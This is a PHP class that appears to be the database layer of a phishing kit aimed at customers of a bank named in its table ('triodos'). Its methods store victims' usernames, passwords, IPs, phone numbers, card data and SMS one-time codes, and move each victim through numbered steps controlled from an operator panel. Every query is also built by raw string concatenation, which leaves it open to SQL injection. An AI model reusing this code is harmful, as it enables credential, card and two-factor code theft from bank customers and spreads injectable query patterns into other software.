<?php
class User {
    private $table = 'triodos';
    public static $site_id;

    public static function getSiteId() {
        return self::$site_id = $_SERVER['SERVER_NAME'];
    }

    public function getTable() {
        return $this->table;
    }

    public static function sessionTime() {
        if (!isset($_SESSION['time'])) 
        {
            $time = $_SESSION['time'] = rand(00000000, 99999999);
        }else 
        {
            $time = $_SESSION['time'];
        }
        return $time;
    }

    public function getLogs() {
        return "SELECT DISTINCT * FROM ".$this->getTable()." WHERE status < 19 AND site_id = '".$this->getSiteId()."'";
    }

    public function getPaginatedLogs($pagination, $record_per_page) {
        return "SELECT DISTINCT * FROM ".$this->getTable()." WHERE status < 19 AND site_id = '".$this->getSiteId()."' ORDER BY id ASC LIMIT ".(($pagination->get_page() - 1) * $record_per_page) . ', ' . $record_per_page;
    }

    public function getStatus($user_id) {
        return "SELECT status FROM $this->table WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function getUserIp($id) {
        return "SELECT ip FROM $this->table WHERE id = '".$id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function createUser($user, $pass, $ip, $ua, $user_id, $status, $updatetime) {
        return "INSERT INTO $this->table(site_id, user, pass, ip, ua, time, status, updatetime) VALUES ('".$this->getSiteId()."', '".$user."', '".$pass."', '".$ip."', '".$ua."', '".$user_id."', ".$status.", '".$updatetime."')";
    }

    public function updateUser($user, $pass, $user_id, $status, $updatetime) {
       return "UPDATE $this->table SET user = '".$user."', pass = '".$pass."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function deleteUser($id) {
        return "DELETE FROM $this->table where id = ".$id." AND site_id = '".$this->getSiteId()."'";
    }

    public function updatePhoneFirma($phone,  $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET phone = '".$phone."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }
    public function updateLinkSMS($linksms,  $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET linksms = '".$linksms."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateCards($cards, $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET cards = '".$cards."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateOtp($otp, $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET sms = '".$otp."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateStep($id, $step) {
        return "UPDATE $this->table SET status = ".$step." WHERE id = ".$id."";
    }

    public function updateTime($user_id) {
        return "UPDATE $this->table SET updatetime = '".time()."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function clearDb() {
        return "DELETE FROM $this->table WHERE site_id = '".$this->getSiteId()."'";
    }
} 